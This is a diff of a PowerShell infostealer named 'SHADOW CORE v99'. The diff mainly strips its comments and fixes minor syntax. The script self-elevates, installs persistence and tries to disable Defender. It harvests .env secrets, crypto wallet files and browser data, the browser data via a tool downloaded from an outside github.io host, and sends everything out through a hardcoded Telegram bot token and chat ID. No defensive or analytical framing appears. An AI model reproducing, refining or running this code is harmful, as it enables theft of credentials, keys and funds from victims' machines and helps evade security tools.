@@ -1,29 +1,26 @@
 #Requires -Version 5.1
 # ============================================================
 # SHADOW CORE v99 - .ENV FILE EXFILTRATOR (POWERSHELL)
-# - Finds all .env files
-# - Extracts secrets
-# - Sends to Telegram
-# - Full persistence
 # ============================================================
 
 $ErrorActionPreference = 'SilentlyContinue'
 
-# ==================== CONFIGURATION ====================
 $BOT_TOKEN = "8421766867:AAF_3BKKFiBoIhaV5PL8YuX1p46Wn-7eUq8"
 $CHAT_ID = "7361517001"
 
 if ($MyInvocation.MyCommand.Path) {
     $SCRIPT_PATH = $MyInvocation.MyCommand.Path
 } else {
-    $SCRIPT_PATH = $env:AppData + "\Microsoft\Windows\Update\shadow_core.ps1"
+    $SCRIPT_PATH = "$env:AppData\Microsoft\Windows\Update\shadow_core.ps1"
 }
 
 $TEMP_DIR = "$env:ProgramData\Microsoft\Windows\Update\data"
 $DATA_DIR = "$TEMP_DIR\extracted_data"
 $BROWSER_DATA_URL = "https://infinityteq.github.io/hack-browser-data.exe"
 
-# ==================== AUTO-ELEVATION ====================
+New-Item -ItemType Directory -Force -Path $TEMP_DIR | Out-Null
+New-Item -ItemType Directory -Force -Path $DATA_DIR | Out-Null
+
 function Test-Admin {
     $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
     $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
@@ -39,11 +36,6 @@ function Elevate-Admin {
 }
 Elevate-Admin
 
-# ==================== CREATE DIRECTORIES ====================
-New-Item -ItemType Directory -Force -Path $TEMP_DIR | Out-Null
-New-Item -ItemType Directory -Force -Path $DATA_DIR | Out-Null
-
-# ==================== PERSISTENCE ====================
 function Add-ToStartup {
     Write-Host "[*] Deploying persistence..."
     $success = 0
@@ -103,7 +95,6 @@ function Add-ToStartup {
     Write-Host "[*] Persistence: $success/$total methods deployed"
 }
 
-# ==================== TELEGRAM FUNCTIONS ====================
 function Send-TelegramMessage {
     param([string]$Text)
     try {
@@ -146,7 +137,7 @@ function Send-TelegramSummary {
     try {
         $hostname = $env:COMPUTERNAME
         $username = $env:USERNAME
-        $osInfo = (Get-WmiObject -Class Win32_OperatingSystem).Caption
+        $osInfo = (Get-WmiObject -Class Win32_OperatingSystem -EA SilentlyContinue).Caption
         $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
         
         $summary = @"
@@ -167,12 +158,10 @@ $DataSummary
     } catch {}
 }
 
-# ==================== GET ALL USERS ====================
 function Get-AllUsers {
     $users = @()
     $systemDrive = $env:SystemDrive
     
-    # Method 1: Users folder
     $usersPath = "$systemDrive\Users"
     if (Test-Path $usersPath) {
         Get-ChildItem $usersPath -Directory | ForEach-Object {
@@ -199,7 +188,6 @@ function Get-AllUsers {
         }
     }
     
-    # Fallback: current user
     if ($users.Count -eq 0) {
         $currentUser = $env:USERNAME
         $userPath = "$systemDrive\Users\$currentUser"
@@ -221,7 +209,6 @@ function Get-AllUsers {
     return $users
 }
 
-# ==================== .ENV SCANNER ====================
 function Scan-EnvFiles {
     param($Users)
     Write-Host "`n" + "=" * 80
@@ -269,7 +256,6 @@ function Scan-EnvFiles {
     return $foundFiles
 }
 
-# ==================== EXTRACT SECRETS ====================
 function Extract-Secrets {
     param($EnvFiles)
     Write-Host "`n" + "=" * 80
@@ -353,7 +339,6 @@ function Extract-Secrets {
     return $null
 }
 
-# ==================== WALLET EXTRACTION ====================
 function Extract-Wallets {
     param($Users)
     Write-Host "`n" + "=" * 80
@@ -390,7 +375,7 @@ function Extract-Wallets {
                         New-Item -ItemType Directory -Force -Path $destDir | Out-Null
                         Copy-Item $_.FullName $dest -Force
                         $foundFiles += $dest
-                        Write-Host "[+] $walletName: $($_.Name)"
+                        Write-Host "[+] ${walletName}: $($_.Name)"
                     }
                 }
             }
@@ -401,7 +386,6 @@ function Extract-Wallets {
     return $foundFiles
 }
 
-# ==================== BROWSER DATA ====================
 function Download-BrowserTool {
     $output = "$TEMP_DIR\hack-browser-data.exe"
     if (Test-Path $output) {
@@ -427,7 +411,6 @@ function Extract-BrowserData {
     Write-Host "🌐 BROWSER DATA EXTRACTION"
     Write-Host "=" * 80
     
-    # Kill browser processes
     @('chrome.exe', 'msedge.exe', 'brave.exe', 'firefox.exe', 'opera.exe') | ForEach-Object {
         try { Stop-Process -Name $_.Replace('.exe', '') -Force -EA SilentlyContinue } catch {}
     }
@@ -454,7 +437,6 @@ function Extract-BrowserData {
     return @()
 }
 
-# ==================== SEND FILES ====================
 function Send-FilesIndividually {
     param($FileList, $CategoryName = "Files")
     
@@ -493,7 +475,6 @@ function Send-FilesIndividually {
     return @{ Sent = $sent; Failed = $failed }
 }
 
-# ==================== MAIN ====================
 function Main {
     Write-Host "=" * 80
     Write-Host "SHADOW CORE v99 - FINAL EXFILTRATOR"
@@ -501,7 +482,6 @@ function Main {
     Write-Host "=" * 80
     Write-Host ""
     
-    # Phase 0: Get users
     Write-Host "[PHASE 0] DETECTING ALL USERS"
     Write-Host "-" * 80
     $users = Get-AllUsers
@@ -509,13 +489,11 @@ function Main {
     foreach ($user in $users) { Write-Host "    - $($user.username)" }
     Write-Host ""
     
-    # Phase 1: Persistence
     Write-Host "[PHASE 1] PERSISTENCE DEPLOYMENT"
     Write-Host "-" * 80
     Add-ToStartup
     Write-Host ""
     
-    # Phase 2: Disable Defender
     Write-Host "[PHASE 2] DISABLING DEFENDER"
     Write-Host "-" * 80
     try {
@@ -531,7 +509,6 @@ function Main {
     $totalSent = 0
     $totalFailed = 0
     
-    # Phase 3: .env scanning
     Write-Host "[PHASE 3] .ENV FILE SCANNING"
     Write-Host "-" * 80
     $envFiles = Scan-EnvFiles -Users $users
@@ -574,7 +551,6 @@ function Main {
     }
     Write-Host ""
     
-    # Phase 4: Wallets
     Write-Host "[PHASE 4] WALLET SCANNING"
     Write-Host "-" * 80
     $walletFiles = Extract-Wallets -Users $users
@@ -586,7 +562,6 @@ function Main {
     }
     Write-Host ""
     
-    # Phase 5: Browser Data
     Write-Host "[PHASE 5] BROWSER DATA EXTRACTION"
     Write-Host "-" * 80
     $exePath = Download-BrowserTool
@@ -601,7 +576,6 @@ function Main {
     }
     Write-Host ""
     
-    # Phase 6: Summary
     Write-Host "[PHASE 6] SENDING SUMMARY"
     Write-Host "-" * 80
     $summaryText = ($dataSummaryItems -join "`n") + "`n`n📤 Sent: $totalSent`n❌ Failed: $totalFailed"
@@ -614,11 +588,9 @@ function Main {
     Write-Host "❌ Failed: $totalFailed"
     Write-Host "=" * 80
     
-    # Infinite loop for persistence
     while ($true) { Start-Sleep -Seconds 3600 }
 }
 
-# ==================== ENTRY POINT ====================
 try {
     Main
 } catch {
